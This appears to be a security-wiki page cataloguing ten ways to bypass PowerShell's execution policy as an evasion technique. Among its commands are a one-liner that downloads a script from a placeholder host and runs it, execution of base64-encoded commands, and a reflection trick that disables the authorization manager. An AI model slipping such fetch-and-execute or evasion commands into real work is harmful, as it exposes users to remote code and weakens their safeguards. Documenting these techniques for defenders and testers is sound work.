---
title: Bypass Execution Policy
description:
type: Evasion
platforms:
    - Windows
actors:
malwares:
link_atomicredteam:
link_mitreattack:
refs:
pubDate: 2024-06-28
---

This article is heavily inspired by the awesome [NetSPI Post](https://www.netspi.com/blog/technical-blog/network-pentesting/15-ways-to-bypass-the-powershell-execution-policy/).  

According to [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4), PowerShell's execution policy is a safety feature that helps prevent the execution of malicious scripts.  
Attackers often attempt to bypass this feature with various methods.

To check current restriction, use `Get-ExecutionPolicy` command:

```powershell
PS> Get-ExecutionPolicy
Restricted
```

<br />

## Method 1. Change Execution Policy Directly

To change execution policy directly, we need to open PowerShell as **Administrator**.  
After opening, run the following command:

```powershell
PS> Set-ExecutionPolicy Unrestricted
```

Then check the result with `Get-ExecutionPolicy`:

```powershell
PS> Get-ExecutionPolicy
Unrestricted
```

<br />

## Method 2. Using -Command Option

We can execute embedded script in command line with `-Command/-c` option.

```powershell
# -NoP (-NoProfile): Not reading profile
PS> powershell -NoP -c "Write-Output '$(Get-Date)'"
```

## Method 3. Using Invoke-Command

```powershell
# -ScriptBlock: Gets a command result
PS> Invoke-Command -ScriptBlock {Write-Output "$(Get-Date)"}
```

<br />

## Method 4. Read Script and Pipe

By getting the contents of the script and passing it to powershell command, we can bypass the restriction.

- **Using Powershell Command**

```powershell
PS> Get-Content .\example.ps1 | powershell.exe -NoP -
```

- **Using Invoke-Expression**

```powershell
PS> Get-Content .\example.ps1 | Invoke-Expression
```

<br />

## Method 5. Download Script and Execute

```powershell
# -c (-Command): Execute command
PS> powershell -NoP -c "iex(New-Object Net.WebClient).DownloadString('https://example.com/example.ps1')"
```

<br />

## Method 6. Execute Encoded Command

We can execute an encoded script with `-EncodedCommand` option.

```powershell
PS> $command = "Write-Output '$(Get-Date)'"
PS> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
PS> $encodedCommand = [Convert]::ToBase64String($bytes)
PS> powershell -NoP -EncodedCommand $encodedCommand
```

<br />

## Method 7. Set ExecutionPolicy

By setting the following policy, we can execute a PowerShell script.

- **Bypass**

Nothing is blocked.

```powershell
PS> powershell -NoP -ExecutionPolicy Bypass -File .\example.ps1
```

- **Unrestricted**

Unsigned scripts can run.

```powershell
PS> powershell -NoP -ExecutionPolicy Unrestricted -File .\example.ps1
```

- **RemoteSigned**

Scripts can run.  
It doesn't require digital signatures on scripts that are **written on the local computer** and not downloaded from the internet.

```powershell
PS> powershell -NoP -ExecutionPolicy RemoteSigned -File .\example.ps1
```

<br />

## Method 8. Disable Execution Policy with AuthorizationManager

```powershell
PS> function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context", "nonpublic,instance").getvalue($executioncontext)).gettype().getfield("_authorizationManager", "nonpublic,instance").setvalue($ctx, (New-Object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}
PS> Disable-ExecutionPolicy
PS> .\example.ps1
```

<br />

## Method 9. Set Execution Policy with Scope

- **Process Scope**

```powershell
PS> Set-ExecutionPolicy Bypass -Scope Process
# or
PS> Set-ExecutionPolicy Unrestricted -Scope Process
# or
PS> Set-ExecutionPolicy RemoteSigned -Scope Process
```

- **CurrentUser Scope**

```powershell
PS> Set-ExecutionPolicy Bypass -Scope CurrentUser
# or
PS> Set-ExecutionPolicy Unrestricted -Scope CurrentUser
# or
PS> Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

Then execute our PowerShell script:

```powershell
PS> .\example.ps1
```

<br />

## Method 10. Edit Registry Key

Open **Registry Editor** and click on `HKEY_LOCAL_MAHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell`.  
Then set `Unrestricted`, `Bypass`, or `RemoteSigned` in the `ExecutionPolicy` field.